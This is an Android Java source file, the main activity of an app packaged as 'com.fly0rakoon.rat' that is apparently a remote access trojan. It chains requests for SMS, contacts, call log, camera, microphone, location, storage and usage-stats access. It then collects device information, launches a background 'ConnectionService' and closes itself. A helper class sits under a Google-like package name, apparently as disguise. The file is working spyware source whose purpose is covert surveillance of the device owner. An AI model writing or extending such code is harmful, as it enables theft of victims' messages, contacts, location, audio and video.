package com.fly0rakoon.rat;



import android.Manifest;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.clientapp.utils.DeviceInfoUtils;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_ALL_PERMISSIONS = 123;
    private static final int REQUEST_CRITICAL_PERMISSIONS = 124;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_SEND_SMS = 125;

    // Core permissions needed for device info collection
    private static final String[] CORE_PERMISSIONS = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.PACKAGE_USAGE_STATS
    };

    // All permissions we'd like to have (including video permissions)
    private final String[] REQUIRED_RUNTIME_PERMISSIONS = new String[] {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.CAMERA, // For video recording
            Manifest.permission.RECORD_AUDIO, // For video recording audio
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE, // For saving video files
            Manifest.permission.WRITE_EXTERNAL_STORAGE, // For saving video files
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.READ_MEDIA_VIDEO
    };

    // Absolutely essential permissions (including video permissions)
    private final String[] CRITICAL_PERMISSIONS = new String[] {
            Manifest.permission.CAMERA, // Essential for video
            Manifest.permission.RECORD_AUDIO, // Essential for video
            Manifest.permission.WRITE_EXTERNAL_STORAGE, // Essential for saving videos
            Manifest.permission.READ_EXTERNAL_STORAGE, // Essential for accessing videos
            Manifest.permission.ACCESS_FINE_LOCATION
    };

    private boolean hasSmsPermissions() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this,
                        Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                &&
                ContextCompat.checkSelfPermission(this,
                        Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // First check SMS permissions since they're critical for sending
        if (!hasSmsPermissions()) {
            requestSmsPermissions();
        }
        // First check core permissions for device info collection
        else if (!allCorePermissionsGranted()) {
            requestCorePermissions();
        }
        // Then check critical permissions (now includes video permissions)
        else if (!hasCriticalPermissions()) {
            requestCriticalPermissions();
        }
        // Then check if we have all desired permissions
        else if (!hasAllRuntimePermissions()) {
            requestAllPermissions();
        }
        // Check for usage stats permission
        else if (!hasUsageStatsPermission()) {
            requestUsageStatsPermission();
        }
        // If we have everything, start the service
        else {
            startServiceAndFinish();
        }
    }

    private void requestSmsPermissions() {
        ActivityCompat.requestPermissions(
                this,
                new String[] {
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS
                },
                PERMISSION_REQUEST_SEND_SMS);
    }

    private boolean allCorePermissionsGranted() {
        for (String permission : CORE_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasCriticalPermissions() {
        for (String permission : CRITICAL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasAllRuntimePermissions() {
        for (String permission : REQUIRED_RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void requestCorePermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : CORE_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                // Skip PACKAGE_USAGE_STATS as it requires special handling
                if (!permission.equals(Manifest.permission.PACKAGE_USAGE_STATS)) {
                    permissionsToRequest.add(permission);
                }
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        } else if (!hasUsageStatsPermission()) {
            requestUsageStatsPermission();
        }
    }

    private void requestCriticalPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : CRITICAL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    REQUEST_CRITICAL_PERMISSIONS);
        }
    }

    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : REQUIRED_RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    REQUEST_ALL_PERMISSIONS);
        }
    }

    private void requestUsageStatsPermission() {
        Toast.makeText(this, "Please grant Usage Access permission", Toast.LENGTH_LONG).show();
        startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
    }

    private void startServiceAndFinish() {
        collectAndLogDeviceInfo();
        startService(new Intent(this, ConnectionService.class));
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_SEND_SMS) {
            handleSmsPermissionsResult(grantResults);
        } else if (requestCode == PERMISSION_REQUEST_CODE) {
            handleCorePermissionsResult(grantResults);
        } else if (requestCode == REQUEST_CRITICAL_PERMISSIONS) {
            handleCriticalPermissionsResult(grantResults);
        } else if (requestCode == REQUEST_ALL_PERMISSIONS) {
            handleAllPermissionsResult(grantResults);
        }
    }

    private void handleSmsPermissionsResult(int[] grantResults) {
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            // SMS permissions granted, check other permissions
            if (!allCorePermissionsGranted()) {
                requestCorePermissions();
            } else if (!hasCriticalPermissions()) {
                requestCriticalPermissions();
            } else if (!hasAllRuntimePermissions()) {
                requestAllPermissions();
            } else if (!hasUsageStatsPermission()) {
                requestUsageStatsPermission();
            } else {
                startServiceAndFinish();
            }
        } else {
            Toast.makeText(this, "SMS permissions are required for full functionality", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private void handleCorePermissionsResult(int[] grantResults) {
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            if (!hasUsageStatsPermission()) {
                requestUsageStatsPermission();
            } else if (!hasCriticalPermissions()) {
                requestCriticalPermissions();
            } else if (!hasAllRuntimePermissions()) {
                requestAllPermissions();
            } else {
                startServiceAndFinish();
            }
        } else {
            Toast.makeText(this, "Core permissions denied. Limited functionality.", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private void handleCriticalPermissionsResult(int[] grantResults) {
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            if (!hasAllRuntimePermissions()) {
                requestAllPermissions();
            } else if (!hasUsageStatsPermission()) {
                requestUsageStatsPermission();
            } else {
                startServiceAndFinish();
            }
        } else {
            Toast.makeText(this, "Critical permissions denied. App cannot function.", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private void handleAllPermissionsResult(int[] grantResults) {
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            if (!hasUsageStatsPermission()) {
                requestUsageStatsPermission();
            } else {
                startServiceAndFinish();
            }
        } else {
            // Even if some non-critical permissions were denied, we can still proceed
            if (hasUsageStatsPermission()) {
                startServiceAndFinish();
            } else {
                requestUsageStatsPermission();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Check if we're returning from permission settings
        if (hasSmsPermissions() && allCorePermissionsGranted() && hasCriticalPermissions() &&
                hasAllRuntimePermissions() && hasUsageStatsPermission()) {
            startServiceAndFinish();
        }
    }

    private void collectAndLogDeviceInfo() {
        try {
            JSONObject info = DeviceInfoUtils.collectDeviceInfo(this);
            Log.d(TAG, "Device Info:\n" + info.toString(4));
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect device info", e);
        }
    }
}
